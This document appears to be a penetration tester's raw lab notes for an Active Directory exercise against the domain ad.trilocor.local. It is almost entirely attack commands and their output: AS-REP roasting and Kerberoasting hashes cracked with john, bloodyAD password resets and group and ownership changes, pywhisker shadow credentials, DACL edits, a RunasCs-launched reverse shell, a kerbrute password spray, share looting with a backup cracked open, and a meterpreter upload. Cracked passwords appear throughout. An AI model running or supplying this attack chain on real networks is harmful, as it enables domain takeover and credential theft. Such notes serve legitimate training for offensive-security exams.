$krb5tgs$23$*sapvc$ad.trilocor.local$SAPsvc/SAP01.ad.trilocor.local*$9945aec5d74915ce279787fdb57c9c08$7d283311c7b6d204da2a8b9721a97f856fc8f37bb7856f2cf68cb83a2a0f2bcf2acf6cac5f502fa236204f077ad6a4d915e4fbac400b64a1bc9f0439871ee5b4ab797a89db9fe8d5284fc8c90d3932b65f605b4859e30d06906a9803e4bd9866f2a6821db98bb52db22363bc5304fa4be375a3452a9c9243d65dfa5ca43e426c17a1bbf0821cdbb67a69f5c23cd3bd0986ead7b66416299eface1898f0f6980c11e2f513f5498e2df18616c3683a68b620787585e53013da05d9cf2bf9ce597d56db01ae60c5875d8f02a7dcdae0a68432715a13ab1e9ce9fde269b09a1108741c2659f29148b4cad7a191e69d0a76876fff86d3d2f1d03d2d8984c8f4bb5d00f112c1b87accfd2f497e335b8047abf558ed48ca1730a51d6cd5b8661d3ddd1e98bf079ab0dedcca31b1f623f7e261f15d08ed6738e1a2e5cca0a602cf499b8677f57da11e08b55e62019eab1ca80aad70e092e12a64dfa9990fc507a0c944ffffd24570767d443dc258c8476b42a875cb13fd83c22fc50c867eb18e8abf4033e3f62c04d6260fa93ff44eef3743eab0081d5601d862ad17076d046706a1ab51935f74c5dff389a652c2213e5b30ac7ecdf3964846db46ce5794fbc48239fb7235987e1ddb95da9b2063575ad3d04b282ac9b982ed9663cf1ff44e33d72127810609162d62872c9c6f9226d8caed597ebd31908a999d8c866089521d63f9ea77d3b1d251de4f27b25439ca1d597536ffee86ac323106010b92dd50842387bda1c680db93125cba6852a6a9ff08399155d88a597e5a2bb5a3a763367439528fbc76531bcb76c70cc5b15d81d887d524aa1e556df418866f7ee72e3c0e69c5ccbf558223e8de867de4a0f0c1bf6e033893edda67739fb6f5b131f22b0ac348f32da9617ca2b1288ace0101f02a55eb585223a7e51f17759d8b0f95973fffe4cfa30036910c4f3cd9d43dee79a26a54de8592529a44a14d2eb2f108648509437ae03aca0cdcb4da7de630da177545663d9511126c53d765323c8d29080e9e365c4e5119e1495acf53d0816be6b39d93f163d7f30e60f5751078dbbbf90a5657b90d213edd3fb41361796fc7fdc6d79030b5f5d02dfbbcda35c10763e57f99933c61adf4f1f30aeb2356819416d9723f2674d9de5432d40832ffee8bb673839a13630ea7d24cb214db68d4a2ba12ddaf361f47b48d056dd5b0e4c011146329ec823ab6805526a2acbcc72f79dce2d513ed15fbdb61cf27b26f1c71ad3231f911c4122dd3f92a7eff4ca7c314f2beb17427d170efb206b47f969214b6f3a2a6ebd573b84302cc14074e5fce30709342e8bfb3fab13364b2d3ff968bec6e85ed6f667d341af23a535b7310babad0b2974a65fdaead48428f955a450a419de8dc664f982794e0c639c43e5aae2a28447b3729d19ccb8d72cf983c5320a7f3e899afa017c96a0029257d9191ce91bddc9d14f59536fb9ca86bc6f962c4298906d81100cf8cb24534890242a62a70688f5a811cfa1c0409aca4d8a3ed8bfeb7f1547d4141c0e796233b56b4c0fd4b19ea406c0f3011b674203efd3bfb692be7d0663e0ed13953c1bbc63fcc740ca7b414caf298ad0c322d0a4ce35e589a8a13244afa5c2dac9762808f2654087ca23b5d7e8c8cb30e26:!qaz2wsx3edc

```


asreproast jwegman

```powershell
PS C:\Users\devuser_1\Documents> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: AS-REP roasting

[*] Target Domain          : ad.trilocor.local

[*] Searching path 'LDAP://DC01.ad.trilocor.local/DC=ad,DC=trilocor,DC=local' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : jwegman
[*] DistinguishedName      : CN=jwegman,CN=Users,DC=ad,DC=trilocor,DC=local
[*] Using domain controller: DC01.ad.trilocor.local (172.16.139.3)
[*] Building AS-REQ (w/o preauth) for: 'ad.trilocor.local\jwegman'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jwegman@ad.trilocor.local:23CEBD52E4B192B49B7DACA9905B117C$DF7830B179E6612787111418F786DFDB630DDD420F07096D8C3A58E2C85622734D76FE8F44F8DF9A5F639974EA5C860ED5EB826D44E8C2B177D47467A0B957FAB9C1A96B5042651EC34AD446420DA5573B1CC75BFD15F8CD4FDB1F6970281F64E42D99902FA5A6B52DC12D524EF063C684EA22AE9D2CB0E61C4D42EAFD8F88A99C3EF58EA85AAA8675040BEB7E2B76826905569139D7CE7BE74479EE4BA1B570F8E669FC75AFCECDC9D921224EF6CAB5D27DB7EE8D99DC6284D05E2B4278E7E27AEFEC3346F2D9EEB9FC9554F346969F49EAC6FFA9283D798E790BD43D0ED6673BF907D6BF009F10B579BBB04B7BAB2499DF742A2E35
```

![[Pasted image 20260123215759.png]]

```bash
john hash_jwegman -w=/usr/share/wordlists/rockyou.txt               
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Roasty07         ($krb5asrep$jwegman@ad.trilocor.local)     
1g 0:00:00:06 DONE (2026-01-23 05:39) 0.1557g/s 1662Kp/s 1662Kc/s 1662KC/s Rock*2482..RoSaLyN123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```







passs en smb dc01
```bash
cat CreateLocalAdminAcc.ps1     
<#
.SYNOPSIS
  Create local admin acc

.DESCRIPTION
  Creates a local administrator account on de computer. Requires RunAs permissions to run

.OUTPUTS
  none

.NOTES
  Version:        1.0
  Author:         R. Mens - LazyAdmin.nl
  Creation Date:  25 march 2022
  Purpose/Change: Initial script development
#>

# Configuration
$username = "adminTest"   # Administrator is built-in name
$password = ConvertTo-SecureString "LazyAdminPwd123!" -AsPlainText -Force  # Super strong plane text password here (yes this isn't secure at all)
$logFile = "\\server\folder\log.txt"

```

![[Pasted image 20260124131234.png]]
```bash
proxychains bloodyAD -d ad.trilocor.local -u phernandez -p 'bLink182' --dc-ip 172.16.139.3 set password ghiggins 'Lalahola23!$'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] Password changed successfully!
```
![[Pasted image 20260124131219.png]]


![[Pasted image 20260124131319.png]]
```bash
proxychains bloodyAD -d ad.trilocor.local -u ghiggins -p 'Lalahola23!$' --dc-ip 172.16.139.3 add groupMember 'Contractors' ghiggins
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] ghiggins added to Contractors
```
![[Pasted image 20260124131533.png]]

![[Pasted image 20260124131557.png]]

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# proxychains python3 pywhisker.py -d "ad.trilocor.local" -u "ghiggins" -p 'Lalahola23!$' --target "divanov" --action "add" --dc-ip 172.16.139.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[*] Searching for the target account
[*] Target user found: CN=divanov,CN=Users,DC=ad,DC=trilocor,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: cd1dc51b-49a4-2b04-8ae4-8f88942f55bb
[*] Updating the msDS-KeyCredentialLink attribute of divanov
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: fYPOJTDh.pfx
[+] PFX exportiert nach: fYPOJTDh.pfx
[i] Passwort für PFX: miwyJLKvon8MyVmGQsvh
[+] Saved PFX (#PKCS12) certificate & key at path: fYPOJTDh.pfx
[*] Must be used with password: miwyJLKvon8MyVmGQsvh
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

![[Pasted image 20260124132212.png]]

shell ghiggins

```bash
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe ghiggins 'Lalahola23!$' "cmd.exe /c C:\Temp\revv.exe"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[*] Warning: User profile directory for user ghiggins does not exists. Use --force-profile if you want to force the creation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

No output received from the process.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

```

![[Pasted image 20260124155850.png]]


![[Pasted image 20260124155829.png]]

```powershell
PS C:\ProgramData> Set-DomainObject -Identity divanov -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
Set-DomainObject -Identity divanov -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=ad,DC=trilocor,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
(&(|(|(samAccountName=divanov)(name=divanov)(displayname=divanov))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'nonexistent/BLAHBLAH' for object 'divanov'
PS C:\ProgramData> $User = Get-DomainUser divanov  
$User = Get-DomainUser divanov
PS C:\ProgramData> $User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
$krb5tgs$23$*divanov$ad.trilocor.local$nonexistent/BLAHBLAH*$5BE140A383E62D711BC11A40CC43EA08$155531EDF2FA78EADF9445EBC7FE5E203CD1B3F8C06FAE63693E0B348AC9D3F383ABC730459AFE82D6B34D388EF40EED3C69BEC43C689A1C6C9947DDF443E60266C90BCF9C11D5F722197BF2D9D64C1E8988605BFF7861707CEDAD9F1463D03475CFD6BF93E409CCA02A53A29327B0A60DE89187137006036BD92E4FC3641AC9922DE8982E9E74C251111B1B6F06D06644810603AA41989F0189A338599B455BAE6960B1641737AD999B9FB46E8DA7D8061919895692A763D7AED59C4F3C8EFA4DAA9DB8FB74C404F71A239F5B7F14D58704AB2D6B62158F84C219AB81A7D0CD66F9882CB0A8B750D2A38974859FC9FDCADF37397011E89E22947F0F8F78CC6300C307C9B0F6A91AF35ECE1568353416467F561B015CDE379FAC775E50470F8E403797C96B167E9F0069AF440FCE015CE999D58C16EAFFE7882F7A2FB3E5A4217E75FBB43CE14E637551DE34950D3A03C9BA28FAD0AEB150A72F120C57D31774DC0A5313917A9765C6AC2E63FE0C238FB0CB012CD395424748FE9B9DDAA7053D48EADA4150B103FF09AE8B960D1BF6C123DC3BFF3AC1EF7ED2558E9824820667069CAC6109007388B1600EBC0274605B40E848EB1BFF0B3EF6A8A58BDC8CE209D90548AD8B00C454AABB096A3472E61209A5BB6641589CD7D6BA7887D7E4E5047FEB9785D29108EF6B15A20465D0C569F1EC4F4AF276CC84B3421C01379144044A53A9DD303EC9CD20D09C4D0087EA4E0F0722F0D8A3D42283C67E1B90C6A04EDC3616F921966C06126C9B3B69ED264AA7E91E6FFCB356C4E016AEE4D3ABE544C0D458B31088E74E8B623006E4DB04DF213F708AC29B1CDBFFE576769E99E90A525B8D5D31EFF7A60576396304037FDE1490CF2D2E9D7B95B5EC1E672F276189C301BAE9E9A6CB6163478251ED358B4A802955BA75F3E202AC9C131D9CDD6E535D3E611AAC15463815FDE1EB058FF5E811A1566C8C9C61CDC08B11B11472B3FC9815C561EA920B9755C1F657ADBB29D71A3A0C5555B9BE9DDAA56D20291ED2B71F6C32F78C1F8D224BAAD52EC04650B199E209D29514ABE4766072B56F0F510C4D51AF5DF46EC20F7EC1D6D200942135B8B7A9F32642435E9E948BA29ED7D97E8C7CCC6DC671AECD4748A19ACE05AB32CCFCF404015A3AD1D4CBEA947EA6B62B893ED12C582F517FBE029AAEADE410F7C51C9B748396EF07FEC50089EF78086FCA700AA75B26EA680AF84B3D0D3D4D95F91FE9D6FB8EA249B908AF0974FA361565CDCBD3919393C47F870EFC134BD2DF9795A1B796D369B6FB6924266AAD3C985111D002E84718B713DD3E9CE2CAAE65B5AAD7272ACADE96B2DF456FA2D1608F4B85441927C1D497301A56759B0F1AC54EEBB34DFFDBBBEADE99FADDC0549F5A7E5F2DA8CA14D34C2E218056B851839AFAE608DEC81358897BE2EBD659D2622E0087F0A6B009FBD5D7DD6BD7A02121A0F38AFE7E3EB4F956CEE1D8B7D907463E44E6F3C428CC602433C5C5E88A55D765D8510B70CBE1451B65DCAE70C9A97D38C733DA0C0F938C252D21F66F68FF31ED465534CAC4A8BB55F1B1DB2CAB4CF98FDD20C8E0E719B6778F651CBD3F00A636949D6E6359B0850CAC01FC85536C83D90A21801EB05EEB1A8EC3237798BE2FBBF8B4709D807839A33D307FAD5DEC15BCCD5B714E5C596C6C2A724109C1334BA3D6B05F2C
```

![[Pasted image 20260124155904.png]]

```bash
john hash_divanov -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Dimitris2001     (?)     
1g 0:00:00:01 DONE (2026-01-24 11:58) 0.8695g/s 1865Kp/s 1865Kc/s 1865KC/s E924217..Devious
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

![[Pasted image 20260124155943.png]]

![[Pasted image 20260124160038.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'MSSP CONNECT' divanov
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] divanov added to MSSP CONNECT
```

![[Pasted image 20260124160056.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 set owner 'TIER I INFRASTRUCTURE' divanov
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] Old owner S-1-5-21-4182522048-3082878045-1431402319-512 is now replaced by divanov on TIER I INFRASTRUCTURE
```

![[Pasted image 20260124160414.png]]

```bash
proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'divanov' -target-dn 'CN=TIER I INFRASTRUCTURE,OU=SECURITY GROUPS,OU=CORP,DC=AD,DC=TRILOCOR,DC=LOCAL' 'ad.trilocor.local'/'divanov':'Dimitris2001' -dc-ip 172.16.139.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[*] DACL backed up to dacledit-20260124-201701.bak
[*] DACL modified successfully!
```
![[Pasted image 20260125001822.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u divanov -p 'Dimitris2001' --dc-ip 172.16.139.3 add groupMember 'TIER I INFRASTRUCTURE' divanov
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] divanov added to TIER I INFRASTRUCTURE
```
![[Pasted image 20260125001924.png]]

```bash
proxychains ldapsearch -x -H ldap://172.16.139.3 \                                                                                         
  -D "divanov@ad.trilocor.local" \
  -w "Dimitris2001" \
  -b "DC=ad,DC=trilocor,DC=local" \
  "(&(isDeleted=TRUE)(objectClass=user))" \
  "*" -E "1.2.840.113556.1.4.417" -c
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
# extended LDIF
#
# LDAPv3
# base <DC=ad,DC=trilocor,DC=local> with scope subtree
# filter: (&(isDeleted=TRUE)(objectClass=user))
# requesting: * 
#

# fjenkins_test
DEL:358192e1-1a2b-48d3-b8ff-4c3c5a2a5a15, Deleted Objects, ad.t
 rilocor.local
dn: CN=fjenkins_test\0ADEL:358192e1-1a2b-48d3-b8ff-4c3c5a2a5a15,CN=Deleted Obj
 ects,DC=ad,DC=trilocor,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn:: ZmplbmtpbnNfdGVzdApERUw6MzU4MTkyZTEtMWEyYi00OGQzLWI4ZmYtNGMzYzVhMmE1YTE1
description: fJ#nk!n$$@123
distinguishedName: CN=fjenkins_test\0ADEL:358192e1-1a2b-48d3-b8ff-4c3c5a2a5a15
 ,CN=Deleted Objects,DC=ad,DC=trilocor,DC=local
instanceType: 4
whenCreated: 20221004120657.0Z
whenChanged: 20221031130516.0Z
uSNCreated: 35849
isDeleted: TRUE
uSNChanged: 143380
name:: ZmplbmtpbnNfdGVzdApERUw6MzU4MTkyZTEtMWEyYi00OGQzLWI4ZmYtNGMzYzVhMmE1YTE
 1
objectGUID:: 4ZKBNSsa00i4/0w8WipaFQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133093588174601326
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAwDhM+V38wLdPd1FVDRIAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: fjenkins_test
lastKnownParent: CN=Users,DC=ad,DC=trilocor,DC=local
dSCorePropagationData: 20221004120856.0Z
dSCorePropagationData: 20221004120842.0Z
dSCorePropagationData: 16010101000001.0Z
msDS-LastKnownRDN: fjenkins_test

# search reference
ref: ldap://ForestDnsZones.ad.trilocor.local/DC=ForestDnsZones,DC=ad,DC=triloc
 or,DC=local

# search reference
ref: ldap://DomainDnsZones.ad.trilocor.local/DC=DomainDnsZones,DC=ad,DC=triloc
 or,DC=local

# search reference
ref: ldap://ad.trilocor.local/CN=Configuration,DC=ad,DC=trilocor,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```
![[Pasted image 20260125002034.png]]


```powershell
*Evil-WinRM* PS C:\programdata> .\kerbrute.exe passwordspray -d ad.trilocor.local --dc 172.16.139.3 valid_users 'fJ#nk!n$$@123'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/24/26 - Ronnie Flathers @ropnop

2026/01/24 22:22:28 >  Using KDC(s):
2026/01/24 22:22:28 >   172.16.139.3:88
2026/01/24 22:22:30 >  [+] VALID LOGIN:  fjenkins_adm@ad.trilocor.local:fJ#nk!n$$@123
2026/01/24 22:22:53 >  [!] devuser_1
@ad.trilocor.local:fJ#nk!n$$@123 - NETWORK ERROR - Can't talk to KDC. Aborting...                                                                                                           
2026/01/24 22:22:53 >  Done! Tested 2925 logins (1 successes) in 24.839 seconds                                                                                                             
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK                                                                                                           
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
```
![[Pasted image 20260125002305.png]]

![[Pasted image 20260125002450.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'FILESHARE ADMINS' fjenkins_adm
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] fjenkins_adm added to FILESHARE ADMINS
```
![[Pasted image 20260125002810.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'HELP DESK' fjenkins_adm 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] fjenkins_adm added to HELP DESK
```
![[Pasted image 20260125002818.png]]

```bash
proxychains bloodyAD -d ad.trilocor.local -u fjenkins_adm -p 'fJ#nk!n$$@123' --dc-ip 172.16.139.3 add groupMember 'DESKTOP ADMINS' fjenkins_adm
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:389  ...  OK
[+] fjenkins_adm added to DESKTOP ADMINS
```
![[Pasted image 20260125002907.png]]

escritura en deparment shares

```bash
proxychains nxc smb 172.16.139.3 -u fjenkins_adm -p 'fJ#nk!n$$@123' --shares
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:135  ...  OK
SMB         172.16.139.3    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:ad.trilocor.local) (signing:True) (SMBv1:None) (Null Auth:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
SMB         172.16.139.3    445    DC01             [+] ad.trilocor.local\fjenkins_adm:fJ#nk!n$$@123 
SMB         172.16.139.3    445    DC01             [*] Enumerated shares
SMB         172.16.139.3    445    DC01             Share           Permissions     Remark
SMB         172.16.139.3    445    DC01             -----           -----------     ------
SMB         172.16.139.3    445    DC01             ADMIN$                          Remote Admin
SMB         172.16.139.3    445    DC01             C$                              Default share
SMB         172.16.139.3    445    DC01             Department Shares READ,WRITE      Share for department users
SMB         172.16.139.3    445    DC01             IPC$            READ            Remote IPC
SMB         172.16.139.3    445    DC01             LotusNotes      READ            LotusNotes
SMB         172.16.139.3    445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.139.3    445    DC01             Print_queue     READ            Jobs task for Printer
SMB         172.16.139.3    445    DC01             Projects        READ            Projects
SMB         172.16.139.3    445    DC01             Public          READ            Public Share
SMB         172.16.139.3    445    DC01             Software                        Softwares
SMB         172.16.139.3    445    DC01             SYSVOL          READ            Logon server share 
SMB         172.16.139.3    445    DC01             Users           READ            Domain Users
SMB         172.16.139.3    445    DC01             ZZZ_archive                     Archives
```
![[Pasted image 20260125004034.png]]

![[Pasted image 20260125010058.png]]
```bash
 proxychains impacket-smbclient ad.trilocor.local/fjenkins_adm:'fJ#nk!n$$@123'@172.16.139.3 -dc-ip 172.16.139.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.3:445  ...  OK
Type help for list of commands
# use department shares
# cd it/private
# cd IT_BACKUP02072022
# get Trilocor_backup_03072022-zip.axx
# pwd
/it/private/IT_BACKUP02072022
```

crack hash axx
![[Pasted image 20260125010208.png]]
```bash
john hash_backup.txt -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (AxCrypt [PBKDF2-SHA512/SHA1 AES 32/64])
Cost 1 (iteration count) is 24800 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*()       (Trilocor_backup_03072022-zip.axx)     
1g 0:00:02:38 DONE (2026-01-24 20:57) 0.006323g/s 158.6p/s 158.6c/s 158.6C/s 240790..sassy13 
Use the "--show" option to display all of the cracked passwords reliably                     
Session completed.
```


https://www.axantum.com/download
![[Pasted image 20260125013615.png]]

![[Pasted image 20260125013626.png]]







kerbrute

```bash
meterpreter > upload kerbrute.exe C:\\programdata\\kerbrute.exe
[*] Uploading  : /home/zs1n/Desktop/CPTS/kerbrute.exe -> C:\programdata\kerbrute.exe
[*] Uploaded 6.72 MiB of 6.72 MiB (100.0%): /home/zs1n/Desktop/CPTS/kerbrute.exe -> C:\programdata\kerbrute.exe
[*] Completed  : /home/zs1n/Desktop/CPTS/kerbrute.exe -> C:\programdata\kerbrute.exe
meterpreter > upload valid_users C:\\programdata\\valid_users
[*] Uploading  : /home/zs1n/Desktop/CPTS/valid_users -> C:\programdata\valid_users
[*] Uploaded 27.12 KiB of 27.12 KiB (100.0%): /home/zs1n/Desktop/CPTS/valid_users -> C:\programdata\valid_users
[*] Completed  : /home/zs1n/Desktop/CPTS/valid_users -> C:\programdata\valid_users
```

![[Pasted image 20260122194629.png]]

```bash
*Evil-WinRM* PS C:\programdata> .\kerbrute.exe

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/22/26 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
*Evil-WinRM* PS C:\programdata> .\kerbrute.exe userenum -d ad.trilocor.local --dc 172.16.139.3 valid_users
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.35:5985  ...  OK

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/22/26 - Ronnie Flathers @ropnop

2026/01/22 17:45:30 >  Using KDC(s):
2026/01/22 17:45:30 >   172.16.139.3:88
2026/01/22 17:45:30 >  [+] VALID USERNAME:       ablemplaid@ad.trilocor.local
2026/01/22 17:45:30 >  [+] VALID USERNAME:       ablempling@ad.trilocor.local
2026/01/22 17:45:30 >  [+] VALID USERNAME:       abless@ad.trilocor.local
```


```bash
PS C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tomcat-9.0.56\bin> net user  
net user

User accounts for \\SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
rhinkle                  svc_liferay              WDAGUtilityAccount       
The command completed successfully.
```


```bash
msfconsole -q                                                                                   
msf > use multi/handler
